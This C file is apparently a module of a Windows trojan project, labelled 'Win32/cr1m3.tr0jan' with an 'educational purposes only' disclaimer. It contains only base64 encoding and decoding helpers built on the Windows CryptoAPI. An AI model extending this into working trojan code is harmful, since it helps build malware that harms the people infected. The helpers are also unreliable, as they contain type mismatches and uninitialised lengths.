/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/
#include "api.h"
#include "base64.h"
extern int os_version; 


int __b64_decode(const char *val) {
	DWORD flags = CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF;
	unsigned len;
	char *decoded = (char *) __alloc(4096);
	int i = 0;

	//_ZeroMemory(decoded, 4096);

	
	if (_CryptStringToBinaryA((char *)val, _lstrlenA(val), CRYPT_STRING_BASE64, (BYTE *)decoded, &len, 0, &flags) == TRUE) {
		val = decoded;
		return(val);
	}

	return((char *)NULL);
}

char * __b64_encode(char *val) {
	int i=0;
	unsigned long len;
	char * encoded = (char *)__alloc(4096);
	
	
	//_ZeroMemory(encoded, 4096);

	if (os_version>1) {
		if (_CryptBinaryToStringA((const BYTE *)val, _lstrlenA(val), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded, &len) == TRUE) {
			val = encoded;
			return(val);
		}
		else
			return((char *)NULL);
	}

	else 
	  return((char *)NULL);
}

/**
 * @brief Base64 encode
 * @param original input original string
 * @param original_len length of original string 
 * @param encode output base64 encode string
 * @returns 0 if error
 *          1 if encoded success
 */
int __base64_encode(const char *original, const int original_len, char *encoded) {
	int i = 0;
	BOOL status = FALSE;
	DWORD len;
	

//	_printf("%s\t%d\n", original, original_len);


	if(os_version>1) {
		status = _CryptBinaryToStringA((const BYTE *)original, original_len, CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF, encoded, &len);
		if(status==FALSE && _lstrlenA(encoded))
			status=TRUE;
		return(status);
	}

	else {
		if(_CryptBinaryToStringA((const BYTE *)original, original_len, CRYPT_STRING_BASE64, encoded, &len)==TRUE) {
			while(encoded[i]!='\0') {
				if(encoded[i]==0x0a || encoded[i]==0x0b)
					encoded[i]='\0';
				i++;
			}
			return(1);
		}
	}
	return(0);
}



/*
 * @brief Base64 decode
 * @param original input original encoded string
 * @param original_len length of original string 
 * @param encode output base64 decode string
 * @returns 0 if error
 *          1 if encoded success
 */
int __base64_decode(const char *original, const int original_len, unsigned char *decoded) {
	DWORD flags = CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF;
	DWORD len;

	int i=0;
	if (_CryptStringToBinaryA((char *)original, original_len, CRYPT_STRING_BASE64, (BYTE *)decoded, &len, 0, &flags) == TRUE) {
		if (len > 0)
			return(1);
	}

	return(0);

}
